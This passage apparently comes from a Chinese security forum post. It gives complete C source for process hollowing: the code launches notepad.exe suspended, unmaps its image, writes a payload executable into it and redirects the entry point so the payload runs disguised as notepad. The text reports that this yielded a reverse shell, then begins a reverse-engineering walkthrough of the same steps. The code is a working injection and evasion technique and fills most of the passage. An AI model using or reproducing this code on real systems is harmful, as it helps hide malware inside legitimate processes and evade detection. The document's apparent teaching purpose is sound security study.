
```c
#include "windows.h"
#include "tchar.h"
#include "stdio.h"
#include "io.h"

// 傀儡进程
#define Puppet L"C:\\Windows\\System32\\notepad.exe"

// ShellCode
#define PayLoad L"C:\\Users\\admin\\Desktop\\test.exe"

#define STATUS_SUCCESS                        (0x00000000L)

typedef NTSTATUS(WINAPI *PFZWUNMAPVIEWOFSECTION)(
    HANDLE      ProcessHandle,
    PVOID       BaseAddress
);

LPBYTE ReadRealFile(LPCTSTR szPath);
BOOL UnmapFakeProcImage(PROCESS_INFORMATION *ppi, LPBYTE pRealFileBuf);
BOOL MapRealProcImage(PROCESS_INFORMATION *ppi, LPBYTE pRealFileBuf);

// 主函数
void _tmain(int argc, TCHAR *argv[])
{
    STARTUPINFO                si = { sizeof(STARTUPINFO), };
    PROCESS_INFORMATION        pi = {0, };
    LPBYTE                  pRealFileBuf = NULL;

    // 准备要写入傀儡进程的数据
    if (!(pRealFileBuf = ReadRealFile(PayLoad)))
        return;

    // 创建傀儡进程
    if (!CreateProcess(Puppet, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        printf("CreateProcess() failed! [%d]\n", GetLastError());
        goto _END;
    }

    // 卸载傀儡进程内存空间数据
    if (!UnmapFakeProcImage(&pi, pRealFileBuf))
    {
        printf("UnmapFakeProcImage() failed!!!\n");
        goto _END;
    }

    // 在傀儡进程内分配内存并将shellcode写入分配的内存
    if (!MapRealProcImage(&pi, pRealFileBuf))
    {
        printf("MapRealProcImage() failed!!!\n");
        goto _END;
    }

    // 恢复傀儡进程的主线程
    if (-1 == ResumeThread(pi.hThread))
    {
        printf("ResumeThread() failed! [%d]\n", GetLastError());
        goto _END;
    }
    // 等待返回
    WaitForSingleObject(pi.hProcess, INFINITE);

_END:
    if (pRealFileBuf != NULL)
        delete[]pRealFileBuf;

    if (pi.hProcess != NULL)
        CloseHandle(pi.hProcess);

    if (pi.hThread != NULL)
        CloseHandle(pi.hThread);
}

LPBYTE ReadRealFile(LPCTSTR szPath)
{
    HANDLE                  hFile = INVALID_HANDLE_VALUE;
    LPBYTE                  pBuf = NULL;
    DWORD                   dwFileSize = 0, dwBytesRead = 0;

    hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
        return NULL;

    dwFileSize = GetFileSize(hFile, NULL);

    if (!(pBuf = new BYTE[dwFileSize]))
        return NULL;

    // memset(pBuf, 0, dwFileSize);

    ReadFile(hFile, pBuf, dwFileSize, &dwBytesRead, NULL);

    CloseHandle(hFile);

    return pBuf;
}

BOOL UnmapFakeProcImage(PROCESS_INFORMATION *ppi, LPBYTE pRealFileBuf)
{
    DWORD                   dwFakeProcImageBase = 0;
    CONTEXT                 ctx = {0, };
    PIMAGE_DOS_HEADER       pIDH = NULL;
    PIMAGE_OPTIONAL_HEADER  pIOH = NULL;
    FARPROC                 pFunc = NULL;

    // 获取傀儡进程CONTEXT
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(ppi->hThread, &ctx))
    {
        printf("GetThreadContext() failed! [%d]\n", GetLastError());
        return FALSE;
    }

    // 获取傀儡进程基址
    if (!ReadProcessMemory(
        ppi->hProcess,
        (LPCVOID)(ctx.Ebx + 8),
        // ctx.Ebx = PEB, ctx.Ebx + 8 = PEB.ImageBase
        &dwFakeProcImageBase,
        sizeof(DWORD),
        NULL))
    {
        printf("ReadProcessMemory() failed! [%d]\n", GetLastError());
        return FALSE;
    }

    // 获取
    pIDH = (PIMAGE_DOS_HEADER)pRealFileBuf;
    pIOH = (PIMAGE_OPTIONAL_HEADER)(pRealFileBuf + pIDH->e_lfanew + 0x18);

    // 如果PayLoad进程基址和傀儡进程基址相同，调用ZwUnmapViewOfSection()卸载
    if (pIOH->ImageBase == dwFakeProcImageBase)
    {
        // 调用 ntdll!ZwUnmapViewOfSection()
        pFunc = GetProcAddress(GetModuleHandle(L"ntdll.dll"),
            "ZwUnmapViewOfSection");
        if (STATUS_SUCCESS != ((PFZWUNMAPVIEWOFSECTION)pFunc)(ppi->hProcess, (PVOID)dwFakeProcImageBase))
        {
            printf("ZwUnmapViewOfSection() failed!!! [%d]\n", GetLastError());
            return FALSE;
        }
    }
    else
    {
        // 否则直接修加载基址就可以
        WriteProcessMemory(
            ppi->hProcess,
            (LPVOID)(ctx.Ebx + 8),
            // PEB.ImageBase of "fake.exe"
            &pIOH->ImageBase,
            // ImageBase of "real.exe"
            sizeof(DWORD),
            NULL);
    }

    return TRUE;
}

BOOL MapRealProcImage(PROCESS_INFORMATION *ppi, LPBYTE pRealFileBuf)
{
    CONTEXT                 ctx = {0, };
    LPBYTE                  pRealProcImage = NULL;
    PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pRealFileBuf;
    PIMAGE_FILE_HEADER      pIFH = (PIMAGE_FILE_HEADER)(pRealFileBuf + pIDH->e_lfanew + 4);
    PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pRealFileBuf + pIDH->e_lfanew + 0x18);
    PIMAGE_SECTION_HEADER   pISH = (PIMAGE_SECTION_HEADER)(pRealFileBuf + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    // 在傀儡进程中申请内存
    if (!(pRealProcImage = (LPBYTE)VirtualAllocEx(
        ppi->hProcess,
        (LPVOID)pIOH->ImageBase,
        pIOH->SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE)))
    {
        printf("VirtualAllocEx() failed!!! [%d]\n", GetLastError());
        return FALSE;
    }

    // 写入 SizeOfHeaders （DOS头+NT头+节表的大小）
    WriteProcessMemory(
        ppi->hProcess,
        pRealProcImage,
        pRealFileBuf,
        pIOH->SizeOfHeaders,
        NULL);

    // 写入各个区块
    for (int i = 0; i < pIFH->NumberOfSections; i++, pISH++)
    {
        if (pISH->SizeOfRawData != 0)
        {
            if (!WriteProcessMemory(
                ppi->hProcess,
                pRealProcImage + pISH->VirtualAddress,
                pRealFileBuf + pISH->PointerToRawData,
                pISH->SizeOfRawData,
                NULL))
            {
                printf("WriteProcessMemory(%.8X) failed!!! [%d]\n",
                    pRealProcImage + pISH->VirtualAddress, GetLastError());
                return FALSE;
            }
        }
    }

    // 获取傀儡进程CONTEXT
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(ppi->hThread, &ctx))
    {
        printf("GetThreadContext() failed! [%d]\n", GetLastError());
        return FALSE;
    }
    // 修改傀儡进程入口点虚拟地址
    ctx.Eax = pIOH->AddressOfEntryPoint + pIOH->ImageBase;
    // VA of EP

    if (!SetThreadContext(ppi->hThread, &ctx))
    {
        printf("SetThreadContext() failed! [%d]\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
```

程序执行后成功创建傀儡进程(`notepad.exe`)

![图片描述](https://bbs.kanxue.com/upload/attach/202205/941725_GWPHJQF4ZC4QYXJ.png)

并且成功反弹Shell

![图片描述](https://bbs.kanxue.com/upload/attach/202205/941725_KEJBJACRKDMNMK3.png)

### 逆向分析创建傀儡进程过程

先找到`main`函数

![图片描述](https://bbs.kanxue.com/upload/attach/202205/941725_M3MVJKDFYFWHXAP.png)

调用`CreateFile`、`GetFileSize`、`ReadFile`读取`test.exe`到内存中
